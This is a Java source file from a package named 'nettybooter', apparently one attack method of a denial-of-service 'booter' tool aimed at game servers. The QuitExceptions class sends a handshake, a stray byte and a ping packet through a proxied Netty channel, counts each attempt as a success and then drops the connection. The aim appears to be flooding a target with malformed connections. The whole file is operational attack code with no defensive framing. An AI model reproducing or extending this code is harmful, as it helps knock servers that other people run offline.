package me.nzxtercode.nettybooter.methods.impl;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import me.nzxtercode.nettybooter.methods.interfaces.IMethod;
import me.nzxtercode.nettybooter.packets.Handshake;
import me.nzxtercode.nettybooter.packets.PingPacket;
import me.nzxtercode.nettybooter.proxy.Proxy;
import me.nzxtercode.nettybooter.utils.NettyBootstrap;

/**
 * The type Quit exceptions.
 */
public class QuitExceptions implements IMethod {

	private final Handshake handshake;

	public QuitExceptions(Handshake handshake) {
		this.handshake = handshake;
	}

	public void accept(Channel channel, Proxy proxy) {
		channel.writeAndFlush(Unpooled.buffer().writeBytes(handshake.getWrappedPacket()));
		channel.writeAndFlush(Unpooled.buffer().writeBytes(new byte[] { 1 }));
		channel.writeAndFlush(
				Unpooled.buffer().writeBytes((new PingPacket(System.currentTimeMillis())).getWrappedPacket()));
		NettyBootstrap.service.success++;
		channel.close();
	}
}
